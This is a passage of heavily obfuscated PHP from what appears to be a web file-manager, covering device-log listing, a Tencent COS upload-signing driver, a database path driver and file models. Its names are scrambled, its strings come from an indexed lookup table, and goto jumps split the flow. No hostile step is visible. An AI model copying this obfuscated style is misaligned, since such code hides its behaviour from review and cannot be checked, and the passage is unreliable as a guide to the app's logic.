$¤¨¦õ[$ÁÑÇû¹È[534]] : $ÁÑÇû¹È[12]; $¾ÌÑ·¾[$ÁÑÇû¹È[1555]] = isset($Î™ãùğ[$¦§šàŒ—]) ? $Î™ãùğ[$¦§šàŒ—] : $€›“€; $¾ÌÑ·¾[$ÁÑÇû¹È[1988]] = $¤¨¦õ; $ºéõë—ë = json_decode($¾ÌÑ·¾[$ÁÑÇû¹È[447]], !0); $¾ÌÑ·¾[$ÁÑÇû¹È[2227]] = isset($ºéõë—ë[$ÁÑÇû¹È[2227]]) ? $ºéõë—ë[$ÁÑÇû¹È[2227]] : $ÁÑÇû¹È[12]; $¾ÌÑ·¾[$ÁÑÇû¹È[2231]] = IpLocation::get($¾ÌÑ·¾[$ÁÑÇû¹È[2227]]); if (strpos($¦§šàŒ—, $ÁÑÇû¹È[2045]) === 0 || isset($ºéõë—ë[$ÁÑÇû¹È[2043]])) { $ºéõë—ë[$ÁÑÇû¹È[87]] = $Éö‰¦ä[$ºéõë—ë[$ÁÑÇû¹È[399]]]; $ºéõë—ë[$ÁÑÇû¹È[2057]] = $Éö‰¦ä[$ºéõë—ë[$ÁÑÇû¹È[2043]]]; if ($ºéõë—ë[$ÁÑÇû¹È[33]] == $ÁÑÇû¹È[550]) { $ºéõë—ë[$ÁÑÇû¹È[447]][$ÁÑÇû¹È[1158]] = $Éö‰¦ä[$ºéõë—ë[$ÁÑÇû¹È[447]][$ÁÑÇû¹È[1158]]]; $ºéõë—ë[$ÁÑÇû¹È[447]][$ÁÑÇû¹È[1159]] = $Éö‰¦ä[$ºéõë—ë[$ÁÑÇû¹È[447]][$ÁÑÇû¹È[1159]]]; } if ($ºéõë—ë[$ÁÑÇû¹È[33]] == $ÁÑÇû¹È[2052]) { $ºéõë—ë[$ÁÑÇû¹È[447]][$ÁÑÇû¹È[399]] = $Éö‰¦ä[$ºéõë—ë[$ÁÑÇû¹È[447]][$ÁÑÇû¹È[399]]]; } if ($ºéõë—ë[$ÁÑÇû¹È[33]] == $ÁÑÇû¹È[1792]) { $ºéõë—ë[$ÁÑÇû¹È[2057]] = $ºéõë—ë[$ÁÑÇû¹È[87]]; $ºéõë—ë[$ÁÑÇû¹È[2043]] = $ºéõë—ë[$ÁÑÇû¹È[2057]][$ÁÑÇû¹È[399]]; $ºéõë—ë[$ÁÑÇû¹È[87]] = !1; $ºéõë—ë[$ÁÑÇû¹È[399]] = $ÁÑÇû¹È[12]; } if ($ºéõë—ë[$ÁÑÇû¹È[87]] && $ºéõë—ë[$ÁÑÇû¹È[87]][$ÁÑÇû¹È[408]] == $ÁÑÇû¹È[1274]) { $«ñöÊğ[] = $¾ÌÑ·¾[$ÁÑÇû¹È[396]]; unset($û³Âòáß[$Ò­ğÎ‰]); continue; } if ($ºéõë—ë[$ÁÑÇû¹È[2057]] && $ºéõë—ë[$ÁÑÇû¹È[2057]][$ÁÑÇû¹È[408]] == $ÁÑÇû¹È[1274]) { $«ñöÊğ[] = $¾ÌÑ·¾[$ÁÑÇû¹È[396]]; unset($û³Âòáß[$Ò­ğÎ‰]); continue; } } $¾ÌÑ·¾[$ÁÑÇû¹È[447]] = $ºéõë—ë; unset($¾ÌÑ·¾[$ÁÑÇû¹È[2236]]); $Øİ¶òö÷[] = $¾ÌÑ·¾; } $this->clearSystemPathLog($«ñöÊğ); return $Øİ¶òö÷; } private function clearSystemPathLog($í£™¡“) { $¼±âÚë‹ =& $_SERVER[Ôó‡è­ƒ]; if (count($í£™¡“) == 0) { return; } $¦ÃØÃÀ = array($¼±âÚë‹[396] => array($¼±âÚë‹[7], array_unique($í£™¡“))); $this->where($¦ÃØÃÀ)->delete(); } public function deviceList($ğ¥å¾ğ, $è½÷Äøö = 0) { $ÃŒ”Æ“ =& $_SERVER[Ôó‡è­ƒ]; $ÀÚÁ¡§ô = array($ÃŒ”Æ“[1655] => $ğ¥å¾ğ, $ÃŒ”Æ“[197] => array($ÃŒ”Æ“[1014], $è½÷Äøö), $ÃŒ”Æ“[33] => $ÃŒ”Æ“[1766]); $´ÕÄŞ = array(); $®ÏƒÌÙ“ = $this->field($ÃŒ”Æ“[2237])->where($ÀÚÁ¡§ô)->order($ÃŒ”Æ“[2055])->limit(50)->select(); foreach ($®ÏƒÌÙ“ as $Øò¥³½‚ => $åÂï·ğ) { if ($Øò¥³½‚ > 0 && abs($åÂï·ğ[$ÃŒ”Æ“[197]] - $®ÏƒÌÙ“[$Øò¥³½‚ - 1][$ÃŒ”Æ“[197]]) < 5) { continue; } $“ÏÜşÔ = json_decode($åÂï·ğ[$ÃŒ”Æ“[447]], !0); $åÂï·ğ[$ÃŒ”Æ“[2227]] = isset($“ÏÜşÔ[$ÃŒ”Æ“[2227]]) ? $“ÏÜşÔ[$ÃŒ”Æ“[2227]] : $ÃŒ”Æ“[12]; unset($“ÏÜşÔ[$ÃŒ”Æ“[2227]]); $ø¨Üªş” = $this->deviceType($“ÏÜşÔ[$ÃŒ”Æ“[2046]]); if (isset($´ÕÄŞ[$ø¨Üªş”])) { continue; } $åÂï·ğ[$ÃŒ”Æ“[2231]] = IpLocation::get($åÂï·ğ[$ÃŒ”Æ“[2227]]); $åÂï·ğ[$ÃŒ”Æ“[447]] = $“ÏÜşÔ; $´ÕÄŞ[$ø¨Üªş”] = $åÂï·ğ; } return array_values($´ÕÄŞ); } public function deviceType($‚şÒæ) { return $‚şÒæ; } } goto C»ŠÉ×ŸàÆ; dÒ„¢ù‡Îã: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($±øîê¡ä) { parent::__construct($±øîê¡ä); $this->signatureVersion($_SERVER[Ôó‡è­ƒ][215]); } public function uploadFormData($›øÒş¯, $ó‡…Éİô = 3600) { $Éµ®¦ñš =& $_SERVER[Ôó‡è­ƒ]; $›òºàÆê = $Éµ®¦ñš[195]; $â÷âáÃ’ = $Éµ®¦ñš[231]; $İÅğÄ›½ = $Éµ®¦ñš[1308]; $””Ûä÷÷ = gmdate($Éµ®¦ñš[1309], time() + $ó‡…Éİô); $„—Ÿé› = (string) time() . $Éµ®¦ñš[71] . (string) (time() + $ó‡…Éİô); $ŒÆÓ±©¡ = array($Éµ®¦ñš[1310] => $””Ûä÷÷, $Éµ®¦ñš[1311] => array(array($Éµ®¦ñš[1312] => $›òºàÆê), array($Éµ®¦ñš[1313] => $this->bucket), array($Éµ®¦ñš[1314], $Éµ®¦ñš[1315], $Éµ®¦ñš[12]), array($Éµ®¦ñš[1316] => $İÅğÄ›½), array($Éµ®¦ñš[1317] => $â÷âáÃ’), array($Éµ®¦ñš[1318] => $this->accessKey), array($Éµ®¦ñš[1319] => $„—Ÿé›))); $ŒÆÓ±©¡ = json_encode($ŒÆÓ±©¡); $Ûå¬”ï = hash_hmac($Éµ®¦ñš[231], $„—Ÿé›, $this->secret); $¡ˆ÷Œİñ = sha1($ŒÆÓ±©¡); $Öû¿¹ = hash_hmac($Éµ®¦ñš[231], $¡ˆ÷Œİñ, $Ûå¬”ï); $¯–«ëÍÅ = array($Éµ®¦ñš[1312] => $›òºàÆê, $Éµ®¦ñš[1316] => $İÅğÄ›½, $Éµ®¦ñš[1320] => base64_encode($ŒÆÓ±©¡), $Éµ®¦ñš[1317] => $â÷âáÃ’, $Éµ®¦ñš[1318] => $this->accessKey, $Éµ®¦ñš[1321] => $„—Ÿé›, $Éµ®¦ñš[1322] => $Öû¿¹, $Éµ®¦ñš[178] => $this->getHost()); return $¯–«ëÍÅ; } public function fileOutLink($ìÇ…ÌÕÆ) { $Î»èõ =& $_SERVER[Ôó‡è­ƒ]; if (substr($ìÇ…ÌÕÆ, 0, 7) == $Î»èõ[1323]) { $ìÇ…ÌÕÆ = $Î»èõ[1324] . substr($ìÇ…ÌÕÆ, 7); } header($Î»èõ[162] . $ìÇ…ÌÕÆ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($É¾‰×´) { $this->pathParse = $É¾‰×´; $this->model = Model($_SERVER[Ôó‡è­ƒ][1325]); } public function getPath($Æ«Ä­šú) { return trim($Æ«Ä­šú, $_SERVER[Ôó‡è­ƒ][8]); } public function pathFather($˜ˆ›Å ) { $’˜±×ù = $this->parse($˜ˆ›Å ); $’˜±×ù = $this->infoSimple($˜ˆ›Å ); return $’˜±×ù ? $’˜±×ù[$_SERVER[Ôó‡è­ƒ][494]] : !1; } public function pathThis($ö¨Øƒâı) { $Ùæ¯Æ¦Ã = $this->infoSimple($ö¨Øƒâı); return $Ùæ¯Æ¦Ã ? $Ùæ¯Æ¦Ã[$_SERVER[Ôó‡è­ƒ][32]] : !1; } public function getPathOuter($«âÇ¼¸) { if (!$«âÇ¼¸) { return $«âÇ¼¸; } $ÛÙ„¼š = $this->parse($«âÇ¼¸); return KodIO::make($ÛÙ„¼š[$_SERVER[Ôó‡è­ƒ][396]]); } public function copyFolderFromIO($Ë×ÔÅõ, $Íè„Ï£¢, $Îï™ö“, $§’ìÓ¿, $ª¿“âƒ’) { $şÚšÑ²¤ = $this->model->copyFolderFromIO($Ë×ÔÅõ, $Íè„Ï£¢, $Îï™ö“, $§’ìÓ¿, $ª¿“âƒ’); return KodIO::make($şÚšÑ²¤); } public function isParentOf($Í„‰íÌ, $µåÎ«¼‚) { return $this->model->isParentOf($Í„‰íÌ, $µåÎ«¼‚); } public function mkfile($ìå·ˆ¸, $€Éì»î = '', $î°Ñğ§ = REPEAT_RENAME) { $½£Õïêğ =& $_SERVER[Ôó‡è­ƒ]; $¾’¥»¶ = $this->parse($ìå·ˆ¸); $ìå·ˆ¸ = $¾’¥»¶[$½£Õïêğ[396]]; for ($ÙËÂµ¸ = 0; $ÙËÂµ¸ < count($¾’¥»¶[$½£Õïêğ[1326]]); $ÙËÂµ¸++) { $´¨ä¯¿Š = $¾’¥»¶[$½£Õïêğ[1326]][$ÙËÂµ¸]; if ($ÙËÂµ¸ == count($¾’¥»¶[$½£Õïêğ[1326]]) - 1) { $ìå·ˆ¸ = $this->model->mkfile($ìå·ˆ¸, $´¨ä¯¿Š, $€Éì»î, $î°Ñğ§); break; } $ìå·ˆ¸ = $this->model->mkdir($ìå·ˆ¸, $´¨ä¯¿Š, REPEAT_SKIP); } return $this->getPathOuter($ìå·ˆ¸); } public function mkdir($àò‹ÎÅ², $›’ıäºŒ = REPEAT_SKIP) { $»ßŞŒÇ =& $_SERVER[Ôó‡è­ƒ]; $èôğ´Ş˜ = $this->parse($àò‹ÎÅ²); $àò‹ÎÅ² = $èôğ´Ş˜[$»ßŞŒÇ[396]]; for ($ÖÖåÃ¬ = 0; $ÖÖåÃ¬ < count($èôğ´Ş˜[$»ßŞŒÇ[1326]]); $ÖÖåÃ¬++) { $£İ§œ™‚ = $èôğ´Ş˜[$»ßŞŒÇ[1326]][$ÖÖåÃ¬]; $àò‹ÎÅ² = $this->model->mkdir($àò‹ÎÅ², $£İ§œ™‚, $›’ıäºŒ); } return $this->getPathOuter($àò‹ÎÅ²); } public function copyFile($üáœÄá, $”„ş¯…à, $±Î£€è‰ = REPEAT_REPLACE) { $«‹„¢Ÿê =& $_SERVER[Ôó‡è­ƒ]; $ÂÇİ•‹Ü = $this->parse($”„ş¯…à); $èÊ·ÜìŞ = $this->model->copy($üáœÄá, $ÂÇİ•‹Ü[$«‹„¢Ÿê[396]], $±Î£€è‰, $ÂÇİ•‹Ü[$«‹„¢Ÿê[78]]); return $èÊ·ÜìŞ ? $this->getPathOuter($èÊ·ÜìŞ) : !1; } public function moveFile($ìû—·û´, $çƒù»Á¦, $˜°¢³Ï˜ = REPEAT_REPLACE) { $ÉÖÂíÜó =& $_SERVER[Ôó‡è­ƒ]; $Ø‘‰”•À = $this->parse($çƒù»Á¦); $„¹’·ã = $this->model->move($ìû—·û´, $Ø‘‰”•À[$ÉÖÂíÜó[396]], $˜°¢³Ï˜, $Ø‘‰”•À[$ÉÖÂíÜó[78]]); return $„¹’·ã ? $this->getPathOuter($„¹’·ã) : !1; } public function copy($¸ò°—€Ï, $–¾†Ç„ï, $°Ø´‘Å˜ = REPEAT_REPLACE, $ß—‚éû = false) { $šËã“î = $this->parse($–¾†Ç„ï); $š‹ñ‡ = $this->model->copy($¸ò°—€Ï, $šËã“î[$_SERVER[Ôó‡è­ƒ][396]], $°Ø´‘Å˜, $ß—‚éû); return $š‹ñ‡ ? $this->getPathOuter($š‹ñ‡) : !1; } public function moveSameAllow() { } public function move($§“Ğ†Åï, $‘¹Ï‚÷´, $«¶ëÂÁˆ = REPEAT_REPLACE, $‰Ùá½üö = false) { $†‰éˆúâ = $this->parse($‘¹Ï‚÷´); $¯˜©õ–Í = $this->model->move($§“Ğ†Åï, $†‰éˆúâ[$_SERVER[Ôó‡è­ƒ][396]], $«¶ëÂÁˆ, $‰Ùá½üö); return $¯˜©õ–Í ? $this->getPathOuter($¯˜©õ–Í) : !1; } public function remove($œ˜ıãÄ, $¥ÚÉ…‰Ï = true) { return $this->model->remove($œ˜ıãÄ, $¥ÚÉ…‰Ï); } public function rename($ÔøÎôªº, $É‚ÎÌíš) { $Æí²Å¸í = $this->model->rename($ÔøÎôªº, $É‚ÎÌíš); return $Æí²Å¸í ? $this->getPathOuter($ÔøÎôªº) : $Æí²Å¸í; } public function size($­ØÓûç˜) { $¥•™Í°« = $this->infoSimple($­ØÓûç˜); return $¥•™Í°« ? $¥•™Í°«[$_SERVER[Ôó‡è­ƒ][80]] : 0; } public function infoSimple($ã‘á©¡ı) { return $this->model->sourceInfo($ã‘á©¡ı); } public function info($Ìú±ğÕû) { return $this->infoParse($Ìú±ğÕû); } public function infoAuth($ĞØ’÷ã¬) { return $this->infoParse($ĞØ’÷ã¬, !1, !0); } public function infoWithChildren($ä…èİÁğ) { return $this->infoParse($ä…èİÁğ, !0); } protected function infoParse($´±¤¯âä, $®£˜›Çâ = false, $¹à’øÌÖ = false) { if (!$®£˜›Çâ) { return $this->model->pathInfo($´±¤¯âä, $¹à’øÌÖ); } return $this->model->pathInfoMore($´±¤¯âä); } public function infoFull($Ì‡„Â¾ó) { $¾°ï™¡ã =& $_SERVER[Ôó‡è­ƒ]; $¸„Æåõè = explode($¾°ï™¡ã[8], $Ì‡„Â¾ó); $õİÜáÓì = implode($¾°ï™¡ã[8], array_splice($¸„Æåõè, 1)); return $this->model->pathInfoByPath($¸„Æåõè[0], $õİÜáÓì); } public function hashSimple($»À™ü­®) { $çç±±í® =& $_SERVER[Ôó‡è­ƒ]; $ÛÖÛ³šº = $this->infoWithChildren($»À™ü­®); return $ÛÖÛ³šº[$çç±±í®[167]][$çç±±í®[174]]; } public function hashMd5($ñŒÎ¹) { $¡¥¦ÑúŞ =& $_SERVER[Ôó‡è­ƒ]; $¶ïÙ¶òÛ = $this->infoWithChildren($ñŒÎ¹); return $¶ïÙ¶òÛ[$¡¥¦ÑúŞ[167]][$¡¥¦ÑúŞ[173]]; } public function exist($ÑËå¦¢) { $·ŒÏæÂÔ =& $_SERVER[Ôó‡è­ƒ]; $¬²ƒ³ªä = $this->parse($ÑËå¦¢); if (!$¬²ƒ³ªä[$·ŒÏæÂÔ[78]]) { return $this->isFile($ÑËå¦¢) || $this->isFolder($ÑËå¦¢); } $±‡Û²Æ = array($·ŒÏæÂÔ[398] => $¬²ƒ³ªä[$·ŒÏæÂÔ[396]], $·ŒÏæÂÔ[32] => $¬²ƒ³ªä[$·ŒÏæÂÔ[78]]); $ÇöÈ¾¹¹ = $this->model->where($±‡Û²Æ)->find(); return $ÇöÈ¾¹¹ ? !0 : !1; } public function isFile($è»ÈÕõ§) { $ùˆãÄæß =& $_SERVER[Ôó‡è­ƒ]; $½¿óÄÇÌ = $this->infoSimple($è»ÈÕõ§); return $½¿óÄÇÌ && $½¿óÄÇÌ[$ùˆãÄæß[407]] == $ùˆãÄæß[89] ? !1 : !0; } public function isFolder($‘ìŸù) { $öùßãÁé =& $_SERVER[Ôó‡è­ƒ]; $éóñâ†š = $this->infoSimple($‘ìŸù); return $éóñâ†š && $éóñâ†š[$öùßãÁé[407]] == $öùßãÁé[89] ? !0 : !1; } public function listPath($”Åš½«, $¾çµÛÁß = false) { $†“‡şŠ =& $_SERVER[Ôó‡è­ƒ]; if ($”Åš½« == $†“‡şŠ[12]) { return !1; } $àË·‰¾¤ = array($†“‡şŠ[398] => $”Åš½«); if ($¾çµÛÁß) { return $this->model->listSource($àË·‰¾¤, -1); } return $this->model->listSource($àË·‰¾¤); } public function has($ˆ§Ş®°, $•”Íœãœ = false, $ãúıîæ‹ = null) { $à÷íèğ² =& $_SERVER[Ôó‡è­ƒ]; $ÄÃôæş = $this->infoWithChildren($ˆ§Ş®°); if ($•”Íœãœ) { return array($à÷íèğ²[207] => $ÄÃôæş[$à÷íèğ²[207]], $à÷íèğ²[206] => $ÄÃôæş[$à÷íèğ²[206]]); } return $ãúıîæ‹ ? $ÄÃôæş[$à÷íèğ²[207]] : $ÄÃôæş[$à÷íèğ²[206]]; } public function listAll($ôØı’Áú) { $¾ıË¡´ë = IO::info($this->pathParse[$_SERVER[Ôó‡è­ƒ][78]]); if (!$¾ıË¡´ë) { return array(); } return $this->model->listAll($ôØı’Áú); } public function getContent($î¿©“) { return $this->model->getContent($î¿©“); } public function setContent($¾ º²šÅ, $ä÷¼Ï”ü = '') { return $this->model->setContent($¾ º²šÅ, $ä÷¼Ï”ü); } public function fileSubstr($Øœ½»üş, $ã›¨«Ä, $ŒÙ¯‹ì) { return $this->model->fileSubstr($Øœ½»üş, $ã›¨«Ä, $ŒÙ¯‹ì); } public function download($Ä‘ƒ©ƒß, $áÔ¼Üİ÷ = '') { $‰ıê©ö¤ = get_path_father($áÔ¼Üİ÷); $Ø–Òºù = get_path_this($áÔ¼Üİ÷); $öşß«Ä = $this->model->fileInfoGet($Ä‘ƒ©ƒß); $¿ËÌó¡ = IO::copy($öşß«Ä[$_SERVER[Ôó‡è­ƒ][78]], $‰ıê©ö¤, !1, $Ø–Òºù); return $¿ËÌó¡; } public function setModifyTime($é€”°ë, $È¿‰£àÔ = '') { $çÓôÉ¯É =& $_SERVER[Ôó‡è­ƒ]; if (!$é€”°ë) { return; } $this->model->where(array($çÓôÉ¯É[414] => $é€”°ë))->save(array($çÓôÉ¯É[86] => $È¿‰£àÔ)); } public function upload($Ú¤åÇ¶, $ßÖããùİ, $¹Î¸¡àé = false, $ù¡´ÜÈ = REPEAT_REPLACE) { $ğĞ§¬ =& $_SERVER[Ôó‡è­ƒ]; $»ÒëÒ Ö = $this->parse($Ú¤åÇ¶); $€³•ĞÅğ = $this->model->addFile($»ÒëÒ Ö[$ğĞ§¬[396]], $ßÖããùİ, $»ÒëÒ Ö[$ğĞ§¬[78]], $¹Î¸¡àé, $ù¡´ÜÈ); return $this->getPathOuter($€³•ĞÅğ); } public function uploadFileByID($Òò¿¢Àˆ, $«øÖèÄò, $¡Ôç€) { $Ì€îÁµ‚ =& $_SERVER[Ôó‡è­ƒ]; $€íšì‡á = $this->parse($Òò¿¢Àˆ); $ æøÛËÌ = $this->model->addFileByFileID($€íšì‡á[$Ì€îÁµ‚[396]], $«øÖèÄò, $€íšì‡á[$Ì€îÁµ‚[78]], $¡Ôç€); return $this->getPathOuter($ æøÛËÌ); } public function addFileByRemote($Êş‡º¹ô, $¨°Í…ĞÙ, $®÷µµ‘¸ = array(), $ª¥€µ¢² = '', $¾ë œ…) { $»ºÍ«Ù• =& $_SERVER[Ôó‡è­ƒ]; $Ó§ÛµÓÑ = $this->parse($Êş‡º¹ô); $ª¥€µ¢² = empty($ª¥€µ¢²) ? $Ó§ÛµÓÑ[$»ºÍ«Ù•[78]] : $ª¥€µ¢²; $‹ù²¶œÀ = $this->model->addFileByRemote($Ó§ÛµÓÑ[$»ºÍ«Ù•[396]], $¨°Í…ĞÙ, $ª¥€µ¢², $®÷µµ‘¸, $¾ë œ…); return $this->getPathOuter($‹ù²¶œÀ); } public function uploadLink($³èÏºÚø, $úá¨Å‘ƒ = 0) { $ŞÑ¦Æøí =& $_SERVER[Ôó‡è­ƒ]; $æ¬ïìñÓ = $this->parse($³èÏºÚø); $â’£îŞ– = _get($GLOBALS[$ŞÑ¦Æøí[7]], $ŞÑ¦Æøí[1327]); $”İ¥Ú£Ç = _get($GLOBALS[$ŞÑ¦Æøí[7]], $ŞÑ¦Æøí[1328]); $³èÏºÚø = Model($ŞÑ¦Æøí[602])->createFileName($æ¬ïìñÓ[$ŞÑ¦Æøí[78]], $â’£îŞ–, $”İ¥Ú£Ç); return IO::uploadLink($³èÏºÚø, $úá¨Å‘ƒ); } public function fileNameAuto($¸êü¥Ã˜, $Ë¥¸‡Æò, $Ô¬Õ‹»¦ = REPEAT_REPLACE, $®ŞÏ˜‹Ï = false) { return $this->model->fileNameAuto($¸êü¥Ã˜, $Ë¥¸‡Æò, $Ô¬Õ‹»¦, $®ŞÏ˜‹Ï); } public function fileNameExist($®¼®¶ĞÇ, $ÑÛÈĞ¼î) { return $this->model->fileNameExist($®¼®¶ĞÇ, $ÑÛÈĞ¼î); } protected function _fileOut($İÏÒ§ ñ, $ŸÎ“¾ÚÍ = false, $Óù¼ã³Æ = false, $–ÛÕ–€ = '', $êåÅƒ = false) { $ìºîùªõ =& $_SERVER[Ôó‡è­ƒ]; $ëèç™°ó = $this->model->sourceInfo($İÏÒ§ ñ); if ($ëèç™°ó[$ìºîùªõ[407]] == $ìºîùªõ[89]) { header($ìºîùªõ[1329]); die; } $›ÜÆ«“º = $this->model->fileInfoGet($İÏÒ§ ñ); $–ÛÕ–€ = $›ÜÆ«“º[$ìºîùªõ[173]] ? $›ÜÆ«“º[$ìºîùªõ[173]] : $–ÛÕ–€; $§ú¤ŞÚ = isset($GLOBALS[$ìºîùªõ[1330]]) ? $GLOBALS[$ìºîùªõ[1330]] : $ëèç™°ó[$ìºîùªõ[32]]; if ($êåÅƒ) { return IO::fileOutServer($›ÜÆ«“º[$ìºîùªõ[78]], $ŸÎ“¾ÚÍ, $§ú¤ŞÚ, $–ÛÕ–€); } IO::fileOut($›ÜÆ«“º[$ìºîùªõ[78]], $ŸÎ“¾ÚÍ, $§ú¤ŞÚ, $–ÛÕ–€); } public function fileOut($ÓÌšªçı, $åŸ¤ÎêÕ = false, $ôº§Ìı = false, $…éŒ­Ìª = '') { $this->_fileOut($ÓÌšªçı, $åŸ¤ÎêÕ, $ôº§Ìı, $…éŒ­Ìª); } public function fileOutServer($ã–ì¼éã, $ıˆùñÆŸ = false, $“¬èß¨ = false, $§ÕÄ±Ò¦ = '') { $this->_fileOut($ã–ì¼éã, $ıˆùñÆŸ, $“¬èß¨, $§ÕÄ±Ò¦, !0); } protected function _fileOutImage($ù³›¨«†, $›ÏˆŸé = 250) { $óú¢·ÜÖ =& $_SERVER[Ôó‡è­ƒ]; $æò§ïğÁ = $this->model->pathInfo($ù³›¨«†); if ($æò§ïğÁ[$óú¢·ÜÖ[407]] == $óú¢·ÜÖ[89]) { show_json($óú¢·ÜÖ[1331] . $ù³›¨«†, !1); } $îíÛ‹‡È = $this->model->fileInfoGet($ù³›¨«†); $îíÛ‹‡È[$óú¢·ÜÖ[32]] = $æò§ïğÁ[$óú¢·ÜÖ[32]]; $îíÛ‹‡È[$óú¢·ÜÖ[166]] = $æò§ïğÁ[$óú¢·ÜÖ[166]]; $GLOBALS[$óú¢·ÜÖ[1330]] = $îíÛ‹‡È[$óú¢·ÜÖ[32]]; $GLOBALS[$óú¢·ÜÖ[165]] = $îíÛ‹‡È; IO::fileOutImage($îíÛ‹‡È[$óú¢·ÜÖ[78]], $›ÏˆŸé); } public function fileOutImage($ó¥±²Íë, $‘·üÑñµ = 250) { $this->_fileOutImage($ó¥±²Íë, $‘·üÑñµ); } public function fileOutImageServer($Ä‘¬ñ¢¥, $‹´§å÷• = 250) { $this->_fileOutImage($Ä‘¬ñ¢¥, $‹´§å÷•); } public function link($Ò»şÁò€, $òç¼©ÜÙ = '') { $éÒ¹¯ÈÛ = $this->model->fileInfoGet($Ò»şÁò€); return IO::link($éÒ¹¯ÈÛ[$_SERVER[Ôó‡è­ƒ][78]], $òç¼©ÜÙ); } protected function parse($øÏµîõå) { $ı«ôˆìš =& $_SERVER[Ôó‡è­ƒ]; if (strstr($øÏµîõå, $ı«ôˆìš[8]) === !1) { return array($ı«ôˆìš[416] => intval($øÏµîõå), $ı«ôˆìš[78] => $ı«ôˆìš[12], $ı«ôˆìš[1326] => array()); } $´Âø˜ = explode($ı«ôˆìš[8], trim($øÏµîõå, $ı«ôˆìš[8])); if (count($´Âø˜) < 2) { show_tips(clear_html($øÏµîõå) . $ı«ôˆìš[1332]); } return array($ı«ôˆìš[416] => intval($´Âø˜[0]), $ı«ôˆìš[78] => $´Âø˜[1], $ı«ôˆìš[1326] => array_slice($´Âø˜, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ßŞ·Şİç) { $this->pathParse = $ßŞ·Şİç; $this->model = Model($_SERVER[Ôó‡è­ƒ][1325]); } public function getPathOuter($¿Ü¤²ó‰) { $ò¦ÅÖÁÖ =& $_SERVER[Ôó‡è­ƒ]; if (!$¿Ü¤²ó‰) { return $¿Ü¤²ó‰; } $–’½æŸÖ = $this->parse($¿Ü¤²ó‰); return trim(KodIO::makeShare($this->pathParse[$ò¦ÅÖÁÖ[396]], $–’½æŸÖ[$ò¦ÅÖÁÖ[396]]), $ò¦ÅÖÁÖ[8]); } protected function infoParse($ºŠşŠ¼æ, $í Ä³¨‰ = false, $ª¾†Ò÷¨ = false) { $³ŞóàÇè =& $_SERVER[Ôó‡è­ƒ]; $í½õğÜö = $this->pathParse[$³ŞóàÇè[396]]; $ß³ß÷è† = trim($this->pathParse[$³ŞóàÇè[1167]], $³ŞóàÇè[8]); return Action($³ŞóàÇè[1333])->sharePathInfo($í½õğÜö, $ß³ß÷è†, $í Ä³¨‰); } public function infoFull($ºÑ¢±Ô) { $´¾µùı¢ =& $_SERVER[Ôó‡è­ƒ]; $ÌÍ»Æ­Í = explode($´¾µùı¢[8], trim($ºÑ¢±Ô, $´¾µùı¢[8])); if (count($ÌÍ»Æ­Í) > 1) { $±äåœò® = implode($´¾µùı¢[8], array_splice($ÌÍ»Æ­Í, 1)); $öŞòÌ°Ñ = $this->model->pathInfoByPath($ÌÍ»Æ­Í[0], $±äåœò®); if (!$öŞòÌ°Ñ) { return !1; } $this->pathParse[$´¾µùı¢[1167]] = $öŞòÌ°Ñ[$´¾µùı¢[399]]; } return $this->infoParse($ºÑ¢±Ô); } public function listAll($Û¶ «Ôİ) { $Ü»ÒÉ³ =& $_SERVER[Ôó‡è­ƒ]; $Å˜Â‰íî = IO::info($this->pathParse[$Ü»ÒÉ³[78]]); if (!$Å˜Â‰íî) { return array(); } $ÁÏ¨¦Şä = $this->model->listAll($Û¶ «Ôİ); $êßë¾¢Û = Model($Ü»ÒÉ³[594])->getInfo($Å˜Â‰íî[$Ü»ÒÉ³[484]]); $ÏüÄèâÑ = Action($Ü»ÒÉ³[1333]); foreach ($ÁÏ¨¦Şä as &$¼Äñßí) { check_abort(); $¼Äñßí[$Ü»ÒÉ³[87]] = $ÏüÄèâÑ->_shareItemeParse($¼Äñßí[$Ü»ÒÉ³[87]], $êßë¾¢Û); } unset($¼Äñßí); return $ÁÏ¨¦Şä; } } goto CÜ©è„‚èƒ; fš„‹Íôë‡: class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\146\x69\154\145\x5f\143\x6f\156\164\x65\156\x74\163"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\124\x69\x6d\x65", "\x74\x69\x6d\145", "\151\156\x73\x65\162\164", "\146\165\x6e\143\164\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\x69\154\x65"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\141\155\145" => "\x69\157\137\146\x69\x6c\145\137\x6d\145\x74\141", "\x6d\145\x74\141\x46\x69\145\x6c\144" => "\146\x69\x6c\x65\111\104"); public function fileInfo($‚÷ìàÒ™) { $µ¥Õ·« =& $_SERVER[Ôó‡è­ƒ]; static $ÀÁ²Óõ÷ = array(); if (!isset($ÀÁ²Óõ÷[$‚÷ìàÒ™])) { $ìÆ–§Ÿ = $µ¥Õ·«[1871]; $•œØø™’ = Model($µ¥Õ·«[466])->field($ìÆ–§Ÿ)->where(array($µ¥Õ·«[464] => $‚÷ìàÒ™))->find(); $ÀÁ²Óõ÷[$‚÷ìàÒ™] = $•œØø™’; } return $ÀÁ²Óõ÷[$‚÷ìàÒ™]; } public function addFileByContent($¨Šõ«ö¼ = '', $Çé‚Öà¦ = '') { $ÎîÓä›× =& $_SERVER[Ôó‡è­ƒ]; $Î¸Ì¶Äñ = TEMP_PATH . $ÎîÓä›×[1872]; if (!is_dir($Î¸Ì¶Äñ)) { mk_dir($Î¸Ì¶Äñ); } $ãóÌŠ÷¥ = $Î¸Ì¶Äñ . $ÎîÓä›×[1873] . rand_string(16); file_put_contents($ãóÌŠ÷¥, $¨Šõ«ö¼); $Ãœª‡œ† = $this->addFile($ãóÌŠ÷¥, $Çé‚Öà¦, !0); if (file_exists($ãóÌŠ÷¥)) { @unlink($ãóÌŠ÷¥); } return $Ãœª‡œ†; } public function createFileName($û¯˜ˆí¤, $ëÇ­« = false, $‚âÍÖ« = false) { $ãÇÖ¶©Û =& $_SERVER[Ôó‡è­ƒ]; $©Ë²×Ü¬ = IO::init($ãÇÖ¶©Û[8]); $¢Üëºƒ¹ = $this->makeFilePath($û¯˜ˆí¤, $©Ë²×Ü¬, $ëÇ­«, $‚âÍÖ«); $¸ğ‘ÅÅ„ = $©Ë²×Ü¬->pathFather($¢Üëºƒ¹); static $ìúÂì˜š = false; $…‡¥‘°Ï = $ãÇÖ¶©Û[1874] . md5($¸ğ‘ÅÅ„); if (!$ìúÂì˜š && 